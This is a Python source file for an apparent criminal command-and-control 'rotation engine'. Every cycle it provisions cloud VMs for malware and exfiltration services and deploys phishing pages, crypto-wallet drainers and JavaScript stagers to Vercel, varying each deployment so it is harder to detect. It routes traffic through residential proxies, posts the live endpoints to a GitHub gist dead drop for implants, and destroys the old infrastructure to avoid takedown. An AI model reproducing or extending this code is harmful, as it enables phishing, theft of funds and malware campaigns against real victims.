# chimera_core_v2.py — Updated rotation engine that deploys payloads
# Replaces the original chimera_core.py

import time
import threading
import secrets
import logging
from datetime import datetime, timezone
from typing import Any, Optional

from core.fly_provisioner import FlyProvisioner
from core.vercel_deployer import VercelDeployer
from core.deaddrop import DeadDrop
from core.proxy_rotator import ProxyRotator
from core.payload_registry import PayloadRegistry
from core.polymorphic_renderer import PolymorphicRenderer

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(message)s")


class ChimeraRotationV2:
    """
    Payload-aware rotation engine.
    Deploys both static payloads (Vercel) and dynamic payloads (Fly VM)
    on every rotation cycle, with polymorphic variation per deployment.
    """

    def __init__(self, config: dict[str, Any], payload_registry: PayloadRegistry) -> None:
        self.fly = FlyProvisioner(
            api_token=str(config["fly_api_token"]),
            org_slug=str(config["fly_org"]),
            region=str(config["fly_region"]),
            app_base=str(config["fly_app_base"]),
        )
        self.vercel = VercelDeployer(
            api_token=str(config["vercel_api_token"]),
            team_slug=str(config["vercel_team"]),
            project_base=str(config["vercel_project_base"]),
        )
        self.drop = DeadDrop(
            gist_token=str(config["github_token"]),
            gist_id=str(config["gist_id"]),
        )
        self.proxies = ProxyRotator(
            provider=str(config["proxy_provider"]),
            username=str(config["proxy_user"]),
            password=str(config["proxy_pass"]),
            endpoint=str(config["proxy_endpoint"]),
        )
        self.registry = payload_registry
        self._config = config
        self.cycle_minutes: int = int(config.get("cycle_minutes", 60))
        self._current: Optional[dict[str, Any]] = None
        self._previous: Optional[dict[str, Any]] = None
        self._lock = threading.Lock()
        self._running = False

    def _rotate_cycle(self) -> dict[str, Any]:
        ts = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
        deployment_seed = secrets.token_hex(16)  # unique polymorphic seed per cycle
        renderer = PolymorphicRenderer(seed=deployment_seed)
        session_key = secrets.token_hex(16)

        # 1. Provision Fly VMs (for dynamic payloads: malware API, exfil, flipper, etc.)
        #    Each payload type may need a different image, so we provision per-payload-type.
        fly_payloads = self.registry.get_fly_payloads()
        fly_sessions: list[dict[str, Any]] = []
        if fly_payloads:
            # Group by image to avoid provisioning duplicate VMs for same image
            seen_images: set[str] = set()
            for pdef in fly_payloads:
                image = pdef.docker_image or "registry.fly.io/chimera-c2:latest"
                if image in seen_images:
                    continue
                seen_images.add(image)

                logging.info(
                    f"[cycle {ts}] Provisioning Fly VM ({pdef.payload_type}) "
                    f"image={image}..."
                )

                # Build VM env from payload config
                vm_env: dict[str, str] = {
                    "DEPLOYMENT_SEED": deployment_seed,
                    # Proxy creds — every VM routes egress through residential proxy
                    "PROXY_ENDPOINT": str(self._config.get("proxy_endpoint", "")),
                    "PROXY_USER": str(self._config.get("proxy_user", "")),
                    "PROXY_PASS": str(self._config.get("proxy_pass", "")),
                    "PROXY_AUTH_FORMAT": "static" if self._config.get("proxy_provider") == "snowproxies" else "session",
                }
                if pdef.custom_config:
                    for k, v in pdef.custom_config.items():
                        if v == "ROTATE_PER_CYCLE":
                            if k == "session_secret":
                                vm_env["SESSION_SECRET"] = secrets.token_hex(32)
                            elif k == "base_url":
                                # Set later after Vercel deploy — placeholder for now
                                vm_env["BASE_URL"] = "PENDING_VERCEL"
                            else:
                                vm_env[k.upper()] = secrets.token_hex(16)
                        else:
                            vm_env[k.upper()] = str(v)

                fly_session = self.fly.provision_vm(
                    suffix=f"{ts}-{pdef.id}",
                    image=image,
                    env=vm_env,
                    memory_mb=pdef.vm_memory_mb or 512,
                    machine_type=pdef.vm_machine_type or "shared-cpu-1x",
                )
                fly_session["session_key"] = session_key
                fly_session["deployment_seed"] = deployment_seed
                fly_session["payload_type"] = pdef.payload_type
                fly_session["payload_id"] = pdef.id
                fly_sessions.append(fly_session)

        # Use the first fly session for backward compat (existing payload rendering)
        fly_session = fly_sessions[0] if fly_sessions else None

        # 2. Deploy Vercel pages (for static payloads: phishing, drainer, stager)
        vercel_payloads = self.registry.get_vercel_payloads()
        vercel_deployments: list[dict[str, Any]] = []
        for pdef in vercel_payloads:
            logging.info(
                f"[cycle {ts}] Deploying Vercel payload: {pdef.id} ({pdef.payload_type})..."
            )

            if pdef.payload_type == "phishing":
                # Render phishing page with polymorphic variation
                html = renderer.render_phishing(
                    pdef,
                    session_key,
                    f"https://{fly_session['ip']}:8443/api" if fly_session else "",
                )
                vdep = self.vercel.deploy_custom(
                    files={"index.html": html},
                    suffix=f"{ts}-{pdef.id}",
                )
                vercel_deployments.append(vdep)

            elif pdef.payload_type == "drainer":
                html = renderer.render_drainer(
                    pdef,
                    session_key,
                    f"https://{fly_session['ip']}:8443/api" if fly_session else "",
                )
                vdep = self.vercel.deploy_custom(
                    files={"index.html": html},
                    suffix=f"{ts}-{pdef.id}",
                )
                vercel_deployments.append(vdep)

            elif pdef.payload_type == "stager":
                js = renderer.render_stager(
                    pdef,
                    session_key,
                    f"https://{fly_session['ip']}:8443/stage2" if fly_session else "",
                )
                vdep = self.vercel.deploy_custom(
                    files={"index.html": "<html></html>", "app.js": js},
                    suffix=f"{ts}-{pdef.id}",
                )
                vercel_deployments.append(vdep)

            elif pdef.payload_type == "telemetry_platform":
                # Deploy a Vercel redirector that proxies ALL routes to the
                # flipper Fly VM (nginx on :8443). The VM serves the React
                # frontend + Express API + Postgres.
                # Find the matching fly session for this payload
                flipper_session = next(
                    (s for s in fly_sessions if s.get("payload_id") == pdef.id),
                    None,
                )
                if flipper_session:
                    target_host = flipper_session.get("hostname") or flipper_session["ip"]
                    target_port = flipper_session["internal_port"]
                    vdep = self.vercel.deploy_redirector(
                        target_host=target_host,
                        target_port=target_port,
                        suffix=f"{ts}-{pdef.id}",
                        proxy_all=True,
                    )
                    vercel_deployments.append(vdep)
                    # Patch the BASE_URL env on the VM to the Vercel URL
                    # (OxaPay callbacks need a public HTTPS URL)
                    vercel_url = f"https://{vdep['deployment_url']}"
                    logging.info(
                        f"[cycle {ts}] Flipper public URL: {vercel_url}"
                    )
                else:
                    logging.warning(
                        f"[cycle {ts}] No Fly session for {pdef.id}, skipping redirector"
                    )

            elif pdef.payload_type == "custom":
                files: dict[str, str] = {}
                if pdef.custom_html:
                    files["index.html"] = pdef.custom_html
                if pdef.custom_js:
                    files["app.js"] = pdef.custom_js
                vdep = self.vercel.deploy_custom(
                    files=files,
                    suffix=f"{ts}-{pdef.id}",
                )
                vercel_deployments.append(vdep)

        # 3. Rotate residential proxy
        logging.info(f"[cycle {ts}] Rotating residential proxy pool...")
        proxy_session = self.proxies.rotate_pool()

        # 4. Build dead drop config
        #    Include ALL active endpoints so the implant knows where to go
        endpoints: dict[str, str] = {}
        if fly_session:
            if vercel_deployments:
                endpoints["api"] = f"https://{vercel_deployments[0]['deployment_url']}/api"
            else:
                endpoints["api"] = f"http://{fly_session['ip']}:8443"
        for vdep in vercel_deployments:
            # Map payload ID to its Vercel URL
            # The implant or operator uses these URLs to direct victims
            endpoints[vdep["project_name"]] = f"https://{vdep['deployment_url']}"
        # Also expose direct Fly VM IPs for payloads that need them
        for fs in fly_sessions:
            if fs.get("payload_id"):
                endpoints[f"fly-{fs['payload_id']}"] = f"http://{fs['ip']}:{fs['internal_port']}"

        new_config: dict[str, Any] = {
            "v": 2,
            "ts": ts,
            "key": session_key,
            "seed": deployment_seed,
            "endpoints": endpoints,
            "px": proxy_session["rotation_token"],
        }

        logging.info(f"[cycle {ts}] Updating dead drop with {len(endpoints)} endpoints...")
        self.drop.update(new_config)

        return {
            "fly": fly_session,          # backward compat — first session
            "fly_sessions": fly_sessions,  # all sessions (for teardown)
            "vercel": vercel_deployments,
            "proxy": proxy_session,
            "config": new_config,
            "ts": ts,
        }

    def _teardown(self, session: Optional[dict[str, Any]]) -> None:
        if not session:
            return
        ts = str(session.get("ts", "unknown"))
        # Destroy all Fly VMs (may be multiple for different payload types)
        fly_sessions = session.get("fly_sessions", [])
        if session.get("fly") and not fly_sessions:
            # Backward compat — single session format
            fly_sessions = [session["fly"]]
        for fs in fly_sessions:
            logging.info(f"[teardown {ts}] Destroying Fly VM {fs.get('app_name', 'unknown')}...")
            self.fly.destroy_vm(str(fs["app_name"]), str(fs["vm_id"]))
        for vdep in session.get("vercel", []):
            logging.info(f"[teardown {ts}] Removing Vercel deployment {vdep['deployment_id']}...")
            self.vercel.destroy_deployment(str(vdep["deployment_id"]))
        logging.info(f"[teardown {ts}] Complete.")

    @property
    def current(self) -> Optional[dict[str, Any]]:
        """Public read-only accessor for the current rotation session."""
        return self._current

    def start(self) -> None:
        self._running = True
        logging.info("Chimera V2 rotation engine started.")
        while self._running:
            with self._lock:
                try:
                    new_session = self._rotate_cycle()
                    self._teardown(self._previous)
                    self._previous = self._current
                    self._current = new_session
                    endpoints = new_session["config"]["endpoints"]
                    for name, url in endpoints.items():
                        logging.info(f"  Active endpoint [{name}]: {url}")
                except Exception as e:
                    logging.error(f"Rotation failed: {e}")
            time.sleep(self.cycle_minutes * 60)

    def stop(self) -> None:
        self._running = False
        if self._current:
            self._teardown(self._current)
        if self._previous:
            self._teardown(self._previous)

